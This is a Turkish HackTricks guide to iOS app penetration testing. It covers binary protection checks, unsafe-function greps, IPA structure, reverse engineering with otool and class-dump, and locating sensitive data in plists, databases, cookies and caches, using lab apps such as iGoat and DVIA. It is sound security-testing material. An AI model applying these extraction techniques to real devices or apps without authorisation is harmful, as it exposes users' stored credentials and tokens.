# iOS Pentesting

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **otomatik iş akışları** oluşturun ve otomatikleştirin.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Sıfırdan kahramana kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) katılın veya [telegram grubuna](https://t.me/peass) katılın veya bizi Twitter'da** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı göndererek HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR gönderin.

</details>

## iOS Temelleri

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Test Ortamı

Bu sayfada **iOS simülatörü**, **emülatörler** ve **jailbreak** hakkında bilgi bulabilirsiniz:

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## İlk Analiz

### Temel iOS Test İşlemleri

Test sırasında **çeşitli işlemler önerilecek** (cihaza bağlanma, dosya okuma/yazma/yükleme/indirme, bazı araçları kullanma...). Bu nedenle, bu işlemlerin nasıl gerçekleştirileceğini bilmiyorsanız, lütfen **sayfayı okumaya başlayın**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
Aşağıdaki adımlar için **uygulamanın cihaza yüklenmiş olması** ve uygulamanın **IPA dosyasının zaten edinilmiş olması** gerekmektedir.\
Bunu nasıl yapacağınızı öğrenmek için [Temel iOS Test İşlemleri](basic-ios-testing-operations.md) sayfasını okuyun.
{% endhint %}

### Temel Statik Analiz

**MobSF** aracını kullanarak IPA dosyasına otomatik Statik Analiz yapmanız önerilir.

**Binary'de bulunan korumaların tanımlanması**:

*   **PIE (Konum Bağımsız Yürütülebilir)**: Etkinleştirildiğinde, uygulama her başlatıldığında rastgele bir bellek adresine yüklenir, başlangıç bellek adresini tahmin etmeyi zorlaştırır.

```bash
otool -hv <app-binary> | grep PIE   # PIE bayrağını içermesi gerekmektedir
```
*   **Yığın Kanaryaları**: Yığının bütünlüğünü doğrulamak için bir 'kanarya' değeri bir işlevi çağırmadan önce yığına yerleştirilir ve işlev sona erdiğinde yeniden doğrulanır.

```bash
otool -I -v <app-binary> | grep stack_chk   # stack_chk_guard ve stack_chk_fail sembollerini içermesi gerekmektedir
```
*   **ARC (Otomatik Referans Sayımı)**: Ortak bellek bozulma hatalarını önlemek için

```bash
otool -I -v <app-binary> | grep objc_release   # _objc_release sembolünü içermesi gerekmektedir
```
*   **Şifrelenmiş Binary**: Binary şifrelenmiş olmalıdır

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # cryptid 1 olmalıdır
```

**Hassas/Güvensiz Fonksiyonların Tanımlanması**

*   **Zayıf Hashleme Algoritmaları**

```bash
# iOS cihazında
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# Linux üzerinde
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **Güvensiz Rastgele Fonksiyonlar**

```bash
# iOS cihazında
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# Linux üzerinde
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **Güvensiz 'Malloc' Fonksiyonu**

```bash
# iOS cihazında
otool -Iv <app> | grep -w "_malloc"

# Linux üzerinde
grep -iER "_malloc"
```
*   **Güvensiz ve Kötüye Kullanılabilir Fonksiyonlar**

```bash
# iOS cihazında
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# Linux üzerinde
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

### Temel Dinamik Analiz

[**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) tarafından gerçekleştirilen dinamik analize göz atın. Farklı görünümler arasında gezinmeniz ve etkileşimde bulunmanız gerekecek, ancak birçok sınıfa bağlanacak ve diğer işlemleri yapacak ve işiniz bittiğinde bir rapor hazırlayacaktır.

### Yüklü Uygulamaların Listelenmesi

`frida-ps -Uai` komutunu kullanarak yüklü uygulamaların **paket tanımlayıcısını** belirleyin:
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Temel Numaralandırma ve Hooking

Uygulamanın bileşenlerini **numaralandırma** ve yöntemleri ve sınıfları kolayca **hooklama** konusunda objection ile nasıl yapılacağını öğrenin:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### IPA Yapısı

Bir **IPA dosyasının** yapısı temelde bir **sıkıştırılmış paket** yapısındadır. Uzantısını `.zip` olarak değiştirerek, içeriğini ortaya çıkarmak için **açılabilir**. Bu yapı içinde, bir **Paket** uygulamanın kurulmaya hazır tamamen paketlenmiş bir uygulamayı temsil eder. İçinde, uygulamanın kaynaklarını kapsayan `<NAME>.app` adında bir dizin bulacaksınız.

* **`Info.plist`**: Bu dosya uygulamanın belirli yapılandırma detaylarını tutar.
* **`_CodeSignature/`**: Bu dizin, paketteki tüm dosyaların bütünlüğünü sağlayan bir imza içeren bir plist dosyasını içerir.
* **`Assets.car`**: Simgeler gibi varlık dosyalarını depolayan sıkıştırılmış bir arşiv.
* **`Frameworks/`**: Bu klasör uygulamanın yerel kütüphanelerini barındırır, bu kütüphaneler `.dylib` veya `.framework` dosyaları şeklinde olabilir.
* **`PlugIns/`**: Bu, uygulamanın uzantılarını içerebilir, `.appex` dosyaları olarak bilinir, ancak her zaman mevcut değildir.
* [**`Core Data`**](https://developer.apple.com/documentation/coredata): Uygulamanızın kalıcı verilerini çevrimdışı kullanım için kaydetmek, geçici verileri önbelleğe almak ve uygulamanıza tek bir cihazda geri alma işlevselliği eklemek için kullanılır. Bir iCloud hesabında birden fazla cihaz arasında veri senkronizasyonu yapmak için Core Data, şemanızı otomatik olarak bir CloudKit konteynerine yansıtır.
* [**`PkgInfo`**](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): `PkgInfo` dosyası, uygulamanızın veya paketinizin türünü ve yaratıcı kodlarını belirtmenin alternatif bir yoludur.
* **en.lproj, fr.proj, Base.lproj**: Bu, belirli diller için kaynakları içeren dil paketleridir ve bir dil desteklenmiyorsa varsayılan bir kaynak içerir.
* **Güvenlik**: `_CodeSignature/` dizini, dijital imzalar aracılığıyla tüm paketlenmiş dosyaların bütünlüğünü doğrulayarak uygulamanın güvenliğinde kritik bir rol oynar.
* **Varlık Yönetimi**: `Assets.car` dosyası, grafiksel varlıkları verimli bir şekilde yönetmek için sıkıştırma kullanır, bu da uygulama performansını optimize etmek ve genel boyutunu azaltmak için önemlidir.
* **Kütüphaneler ve Eklentiler**: Bu dizinler, iOS uygulamalarının modülerliğini vurgular, geliştiricilere tekrar kullanılabilir kod kütüphanelerini (`Frameworks/`) içermelerine ve uygulama işlevselliğini genişletmelerine (`PlugIns/`) olanak tanır.
* **Yerelleştirme**: Yapı, özel dil paketleri için kaynakları içererek çoklu dilleri destekler, böylece belirli dil paketleri için kaynakları içererek küresel uygulama erişimini kolaylaştırır.

**Info.plist**

**Info.plist**, iOS uygulamaları için bir köşetaşı olarak hizmet eder, ana yapılandırma verilerini **anahtar-değer** çiftleri şeklinde kapsar. Bu dosya sadece uygulamalar için değil, aynı zamanda uygulama uzantıları ve içinde paketlenmiş çerçeveler için de gereklidir. XML veya ikili bir formatta yapılandırılmış olup, uygulama izinlerinden güvenlik yapılandırmalarına kadar kritik bilgileri içerir. Mevcut anahtarlar hakkında detaylı keşif için [**Apple Geliştirici Belgelerine**](https://developer.apple.com/documentation/bundleresources/information\_property\_list?language=objc) başvurulabilir.

Bu dosya ile çalışmak isteyenler için daha erişilebilir bir formatta çalışmak için XML dönüşümü, macOS'ta (`plutil` ile, 10.2 ve sonraki sürümlerde doğal olarak mevcuttur) veya Linux'ta (`plistutil` ile) kolayca gerçekleştirilebilir. Dönüşüm için komutlar şunlardır:

* **macOS için**:
```bash
$ plutil -convert xml1 Info.plist
```
* **Linux için**:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Info.plist** dosyasının ifşa edebileceği bilgi yığını arasında, dikkate değer girişler arasında uygulama izni dizeleri (`UsageDescription`), özel URL şemaları (`CFBundleURLTypes`) ve App Transport Security için yapılandırmalar (`NSAppTransportSecurity`) bulunmaktadır. Bu girişler, `grep` komutunu kullanarak dosyayı inceleyerek veya basit bir şekilde yerini tespit edebilir.
```bash
$ grep -i <keyword> Info.plist
```
**Veri Yolları**

iOS ortamında, dizinler özellikle **sistem uygulamaları** ve **kullanıcı tarafından yüklenen uygulamalar** için ayrılmıştır. Sistem uygulamaları `/Applications` dizininde bulunurken, kullanıcı tarafından yüklenen uygulamalar `/private/var/containers/` altına yerleştirilir. Bu uygulamalara **128-bit UUID** olarak bilinen benzersiz bir kimlik ataması yapılır, bu nedenle uygulamanın klasörünü manuel olarak bulmak rastgele dizin adlarından dolayı zor olabilir.

Kullanıcı tarafından yüklenen bir uygulamanın kurulum dizinini keşfetmeyi kolaylaştırmak için **objection aracı** yararlı bir `env` komutu sağlar. Bu komut, söz konusu uygulama için detaylı dizin bilgilerini ortaya çıkarır. Aşağıda bu komutun nasıl kullanılacağına dair bir örnek bulunmaktadır:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Alternatif olarak, uygulama adı `find` komutu kullanılarak `/private/var/containers` içinde aranabilir:
```bash
find /private/var/containers -name "Progname*"
```
Komutlar `ps` ve `lsof` ayrıca uygulamanın işlemini tanımlamak ve sırasıyla açık dosyaları listelemek için kullanılabilir, uygulamanın etkin dizin yollarına dair içgörüler sağlar:
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
**Paket dizini:**

* **AppName.app**
* Bu, IPA'da daha önce görüldüğü gibi Uygulama Paketi olup, temel uygulama verilerini, statik içeriği ve uygulamanın derlenmiş ikilisini içerir.
* Bu dizin kullanıcılara görünür, ancak **kullanıcılar yazamaz**.
* Bu dizindeki içerik **yedeklenmez**.
* Bu klasörün içeriği kod imzasını **doğrulamak** için kullanılır.

**Veri dizini:**

* **Documents/**
* Tüm kullanıcı tarafından oluşturulan verileri içerir. Uygulama son kullanıcı bu verilerin oluşturulmasını başlatır.
* Kullanıcılara görünür ve **kullanıcılar yazabilir**.
* Bu dizindeki içerik **yedeklenir**.
* Uygulama, `NSURLIsExcludedFromBackupKey` ayarlayarak yolları devre dışı bırakabilir.
* **Library/**
* **Kullanıcıya özgü olmayan dosyaları** içerir, **ön bellekler**, **tercihler**, **çerezler** ve özellik listesi (plist) yapılandırma dosyaları gibi.
* iOS uygulamaları genellikle `Application Support` ve `Caches` alt dizinlerini kullanır, ancak uygulama özel alt dizinler oluşturabilir.
* **Library/Caches/**
* **Yarı kalıcı önbellek dosyalarını** içerir.
* Kullanıcılara **görünmez ve kullanıcılar yazamaz**.
* Bu dizindeki içerik **yedeklenmez**.
* Uygulama çalışmıyorken ve depolama alanı azaldığında işletim sistemi bu dizinin dosyalarını otomatik olarak silebilir.
* **Library/Application Support/**
* Uygulamanın çalıştırılması için gerekli olan **kalıcı dosyaları** içerir.
* Kullanıcılara **görünmez ve kullanıcılar yazamaz**.
* Bu dizindeki içerik **yedeklenir**.
* Uygulama, `NSURLIsExcludedFromBackupKey` ayarlayarak yolları devre dışı bırakabilir.
* **Library/Preferences/**
* Bir uygulama yeniden başlatıldıktan sonra bile **kalıcı olabilen özellikleri** depolamak için kullanılır.
* Bilgiler, \[BUNDLE\_ID].plist adlı bir plist dosyasında şifrelenmemiş olarak uygulama kum havuzunun içinde kaydedilir.
* `NSUserDefaults` kullanılarak depolanan tüm anahtar/değer çiftleri bu dosyada bulunabilir.
* **tmp/**
* Uygulama başlatmaları arasında kalıcı olması gerekli olmayan **geçici dosyaları** yazmak için bu dizini kullanın.
* Kalıcı olmayan önbellek dosyalarını içerir.
* Kullanıcılara **görünmez**.
* Bu dizindeki içerik yedeklenmez.
* Uygulama çalışmıyorken ve depolama alanı azaldığında işletim sistemi bu dizinin dosyalarını otomatik olarak silebilir.

iGoat-Swift'in Uygulama Paketi (.app) dizinine (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`) daha yakından bakalım:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Binary Tersine Mühendislik

`<application-name>.app` klasörü içinde `<application-name>` adında bir ikili dosya bulacaksınız. Bu dosya **çalıştırılacak** dosyadır. İkili dosyayı temel bir inceleme yapmak için **`otool`** aracını kullanabilirsiniz:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**Uygulamanın şifrelenip şifrelenmediğini kontrol edin**

Aşağıdaki komutu kullanarak çıktı olup olmadığını kontrol edin:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**Binary dosyasının ayrıştırılması**

Metin bölümünü ayrıştırın:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
**Örnek uygulamanın Objective-C segmentini** yazdırmak için şunu kullanabilirsiniz:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Kodun daha kompakt hale gelmesi için [**class-dump**](http://stevenygard.com/projects/class-dump/) kullanabilirsiniz:
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
Ancak, binary dosyasını çözmek için en iyi seçenekler: [**Hopper**](https://www.hopperapp.com/download.html?) ve [**IDA**](https://www.hex-rays.com/products/ida/support/download_freeware/).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen **otomatik iş akışları** oluşturun ve otomatikleştirin.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Veri Depolama

iOS'un cihazda veri depolama hakkında bilgi edinmek için bu sayfayı okuyun:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
Uygulama **kurulduktan hemen sonra**, uygulamanın tüm işlevleri kontrol edildikten sonra ve hatta **bir kullanıcıdan çıkıp farklı bir kullanıcıya giriş yapıldıktan sonra** bilgi depolama yerleri kontrol edilmelidir.\
Amaç, uygulamanın (şifreler, tokenlar), mevcut kullanıcının ve önceki oturum açmış kullanıcıların **korumasız hassas bilgilerini** bulmaktır.
{% endhint %}

### Plist

**plist** dosyaları, **anahtar-değer çiftlerini içeren yapılandırılmış XML dosyalarıdır**. Kalıcı verileri depolamanın bir yoludur, bu nedenle bazen bu dosyalarda **hassas bilgiler bulabilirsiniz**. Bu dosyaların, uygulamayı yükledikten ve yoğun bir şekilde kullandıktan sonra kontrol edilmesi önerilir.

Plist dosyalarında veri saklamanın en yaygın yolu, **NSUserDefaults**'un kullanılmasıdır. Bu plist dosyası, **`Library/Preferences/<appBundleID>.plist`** içinde uygulama sandbox'ında kaydedilir.

[`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) sınıfı, varsayılan sistemle etkileşim için programatik bir arayüz sağlar. Varsayılan sistem, bir uygulamanın davranışını **kullanıcı tercihlerine** göre özelleştirmesine izin verir. `NSUserDefaults` tarafından kaydedilen veriler, uygulama paketinde görüntülenebilir. Bu sınıf, **veriyi** bir **plist** **dosyasında** saklar, ancak küçük miktarlarda veriyle kullanılması amaçlanmıştır.

Bu verilere doğrudan güvenilir bir bilgisayardan erişilemez, ancak bir **yedekleme** yaparak erişilebilir.

`NSUserDefaults` kullanılarak kaydedilen bilgileri **`NSUserDefaults`** kullanarak çözebilirsiniz.

Uygulama tarafından kullanılan tüm plist dosyalarını bulmak için `/private/var/mobile/Containers/Data/Application/{APPID}` dizinine erişebilir ve şunu çalıştırabilirsiniz:
```bash
find ./ -name "*.plist"
```
**XML veya ikili (bplist) formatındaki dosyaları XML'e dönüştürmek için, işletim sisteminize bağlı olarak çeşitli yöntemler mevcuttur:**

**MacOS Kullanıcıları için:** `plutil` komutunu kullanın. Bu amaçla tasarlanmış olan macOS'ta (10.2+), yerleşik bir araçtır.
```bash
$ plutil -convert xml1 Info.plist
```
**Linux Kullanıcıları için:** İlk olarak `libplist-utils`'ı yükleyin, ardından dosyanızı dönüştürmek için `plistutil`'ı kullanın:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Objection Oturumu İçinde:** Mobil uygulamaları analiz etmek için belirli bir komut, plist dosyalarını doğrudan dönüştürmenize olanak tanır:
```bash
ios plist cat /private/var/mobile/Containers/Data/Application/<Application-UUID>/Library/Preferences/com.some.package.app.plist
```
### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple_ref/doc/uid/TP40001075-CH8-SW1) uygulamanızdaki nesnelerin model katmanını yönetmek için bir çerçevedir. [Core Data, kalıcı depolama olarak SQLite'i kullanabilir](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), ancak çerçeve kendisi bir veritabanı değildir.\
CoreData, verilerini varsayılan olarak şifrelemez. Bununla birlikte, CoreData'ye ek bir şifreleme katmanı ekleyebilirsiniz. Daha fazla ayrıntı için [GitHub Repo](https://github.com/project-imas/encrypted-core-data)'ya bakın.

Bir uygulamanın SQLite Core Data bilgilerini `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support` yolunda bulabilirsiniz.

**Eğer SQLite'i açabilir ve hassas bilgilere erişebilirseniz, yanlış yapılandırmayı buldunuz demektir.**

{% code title="iGoat'tan Kod" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase), SQLite üzerine inşa edilmiş bir anahtar/değer deposudur.\
Yap veritabanları sqlite veritabanları olduğundan, bunları önceki bölümde belirtilen amaçlı komutu kullanarak bulabilirsiniz.

### Diğer SQLite Veritabanları

Uygulamaların kendi sqlite veritabanlarını oluşturması yaygındır. Bu veritabanlarında **duyarlı veriler** saklayabilir ve bunları şifrelememiş olarak bırakabilirler. Bu nedenle, her veritabanını uygulamanın dizininde kontrol etmek her zaman ilginç olacaktır. Bu nedenle, verilerin kaydedildiği uygulama dizinine gidin (`/private/var/mobile/Containers/Data/Application/{APPID}`).
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Firebase Gerçek Zamanlı Veritabanları

Geliştiricilere Firebase Gerçek Zamanlı Veritabanları aracılığıyla **veri depolama ve senkronizasyonu** imkanı sunulmaktadır. JSON formatında depolanan veriler, gerçek zamanlı olarak tüm bağlı istemcilere senkronize edilir.

Firebase veritabanlarında yanlış yapılandırılmış veritabanlar için nasıl kontrol yapılacağını buradan bulabilirsiniz:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Realm veritabanları

[Realm Objective-C](https://realm.io/docs/objc/latest/) ve [Realm Swift](https://realm.io/docs/swift/latest/) Apple tarafından sağlanmayan güçlü bir veri depolama alternatifi sunar. Varsayılan olarak, veriler şifrelenmeden depolanır ve şifreleme belirli yapılandırmalar aracılığıyla sağlanabilir.

Veritabanları şurada bulunur: `/private/var/mobile/Containers/Data/Application/{APPID}`. Bu dosyaları keşfetmek için şu gibi komutlar kullanılabilir:
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Bu veritabanı dosyalarını görüntülemek için [**Realm Studio**](https://github.com/realm/realm-studio) aracı önerilir.

Bir Realm veritabanı içinde şifreleme uygulamak için aşağıdaki kod parçacığı kullanılabilir:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Couchbase Lite Veritabanları

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios), **hafif** ve **yerleşik** bir veritabanı motoru olarak tanımlanmaktadır ve **belge odaklı** (NoSQL) yaklaşımı benimsemektedir. **iOS** ve **macOS** için yerel olarak tasarlanmış olup, verilerin senkronizasyonunu sorunsuz bir şekilde sağlar.

Bir cihazda potansiyel Couchbase veritabanlarını tanımlamak için aşağıdaki dizin incelenmelidir:
```bash
ls /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/
```
### Çerezler

iOS, uygulamaların çerezlerini her uygulamanın klasörü içindeki **`Library/Cookies/cookies.binarycookies`** içinde saklar. Bununla birlikte, geliştiriciler bazen bu çerezleri **anahtarlık** içinde saklamayı tercih eder çünkü bahsi geçen **çerez dosyasına yedeklerden erişilebilir**.

Çerez dosyasını incelemek için [**bu python betiğini**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) kullanabilir veya objection'ın **`ios cookies get`** komutunu kullanabilirsiniz.\
**Ayrıca objection'ı kullanarak** bu dosyaları JSON formatına dönüştürebilir ve verileri inceleyebilirsiniz.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Önbellek

NSURLSession varsayılan olarak **HTTP isteklerini ve yanıtlarını Cache.db veritabanında** saklar. Bu veritabanı, eğer tokenlar, kullanıcı adları veya başka hassas bilgiler önbelleğe alındıysa **hassas veriler** içerebilir. Önbelleğe alınan bilgileri bulmak için uygulamanın veri dizinine (`/var/mobile/Containers/Data/Application/<UUID>`) gidin ve `/Library/Caches/<Bundle Identifier>` yolunu izleyin. **WebKit önbelleği de Cache.db dosyasında saklanmaktadır**. **Objection**, bu dosyayla `sqlite connect Cache.db` komutuyla etkileşime girebilir, çünkü bu **normal bir SQLite veritabanıdır**.

Bu verilerin **önbelleğe alınmasının devre dışı bırakılması önerilir**, çünkü istekte veya yanıtta hassas bilgiler içerebilir. Aşağıdaki liste, bunu başarmanın farklı yollarını göstermektedir:

1. Oturum kapatıldıktan sonra önbelleğe alınan yanıtların kaldırılması önerilir. Apple'ın sağladığı [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses) adlı yöntemle bunu yapabilirsiniz. Bu yöntemi aşağıdaki gibi çağırabilirsiniz:

`URLCache.shared.removeAllCachedResponses()`

Bu yöntem, Cache.db dosyasındaki tüm önbelleğe alınan istekleri ve yanıtları kaldıracaktır.
2. Çerezlerin avantajından faydalanmanıza gerek yoksa, URLSession'ın [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) yapılandırma özelliğini kullanmanız önerilir, bu da çerezleri ve önbelleği kaydetmeyi devre dışı bırakacaktır.

[Apple belgeleri](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`Bir geçici oturum yapılandırma nesnesi, varsayılan bir oturum yapılandırmasıyla (bkz. varsayılan) benzerdir, ancak karşılık gelen oturum nesnesi önbellekleri, kimlik bilgisi depolarını veya diske herhangi bir oturumla ilgili veriyi depolamaz. Bunun yerine, oturumla ilgili veriler RAM'de depolanır. Bir geçici oturumun verileri diske yazdığı tek zaman, bir URL'nin içeriğini bir dosyaya yazmasını söylediğinizde olur.`
3. Önbellek, [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed) önbellek politikasına ayarlanarak da devre dışı bırakılabilir. Bu, önbelleğin hafızada veya diske herhangi bir şekilde saklanmasını devre dışı bırakacaktır.

### Anlık Görüntüler

Ev düğmesine bastığınızda, iOS **mevcut ekranın bir anlık görüntüsünü alır** ve uygulamaya geçişi çok daha sorunsuz hale getirmek için kullanır. Ancak, eğer mevcut ekranda **hassas veriler** varsa, bu veriler **resimde saklanır** (bu, **yeniden başlatmalara karşın kalıcıdır**). Bu, uygulamalar arasında geçiş yapmak için ev ekranına çift dokunarak erişebileceğiniz anlık görüntülerdir.

